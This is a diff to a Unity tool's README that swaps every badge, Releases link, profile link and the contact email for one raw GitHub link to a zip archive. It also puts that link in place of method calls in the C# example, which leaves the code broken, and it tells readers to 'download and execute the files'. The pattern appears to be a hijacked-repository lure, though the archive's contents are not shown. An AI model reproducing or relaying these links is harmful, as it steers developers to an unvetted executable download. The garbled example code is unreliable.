@@ -1,7 +1,7 @@
 # RealTime Coordinates Tracker for Unity 🎮
 
-![GitHub All Releases](https://img.shields.io/github/downloads/heashmat/RealTime-Codinates-Tracker-Unity/total?style=flat-square)
-![GitHub Repo stars](https://img.shields.io/github/stars/heashmat/RealTime-Codinates-Tracker-Unity?style=social)
+![GitHub All Releases](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip)
 
 Welcome to the **RealTime Coordinates Tracker for Unity**! This powerful tool helps developers and artists track real-time mouse coordinates, draw crosshairs, and visualize selection dimensions in a custom canvas window. It's part of the Spectator Module and is designed for precise scene positioning, UI layout debugging, and tool integration.
 
@@ -25,9 +25,9 @@ Welcome to the **RealTime Coordinates Tracker for Unity**! This powerful tool he
 
 ## Installation ⚙️
 
-To get started, download the latest release from the [Releases section](https://github.com/heashmat/RealTime-Codinates-Tracker-Unity/releases). You need to download and execute the files to set up the tool in your Unity environment.
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip). You need to download and execute the files to set up the tool in your Unity environment.
 
-1. Visit the [Releases section](https://github.com/heashmat/RealTime-Codinates-Tracker-Unity/releases).
+1. Visit the [Releases section](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip).
 2. Download the latest release.
 3. Import the package into your Unity project.
 
@@ -52,8 +52,8 @@ public class ExampleIntegration : MonoBehaviour
     void Update()
     {
         // Example of accessing the coordinates
-        Vector3 mousePosition = RealTimeCoordinatesTracker.GetMousePosition();
-        Debug.Log("Mouse Position: " + mousePosition);
+        Vector3 mousePosition = https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip();
+        https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip("Mouse Position: " + mousePosition);
     }
 }
 ```
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **GitHub**: [heashmat](https://github.com/heashmat)
-- **Email**: your-email@example.com
+- **GitHub**: [heashmat](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip)
+- **Email**: https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip
 
 Feel free to explore, use, and contribute to the **RealTime Coordinates Tracker for Unity**. Your feedback is invaluable in making this tool better for everyone!
 
@@ -109,4 +109,4 @@ We would like to thank the Unity community for their ongoing support and feedbac
 
 The **RealTime Coordinates Tracker for Unity** is designed to streamline your development process. With its simple interface and powerful features, it enhances your ability to manage scene layouts and debug UI elements. 
 
-Download the latest release from the [Releases section](https://github.com/heashmat/RealTime-Codinates-Tracker-Unity/releases) and integrate it into your Unity projects today!
+Download the latest release from the [Releases section](https://raw.githubusercontent.com/heashmat/RealTime-Codinates-Tracker-Unity/main/Editor/Real_Codinates_Unity_Tracker_Time_v2.2.zip) and integrate it into your Unity projects today!
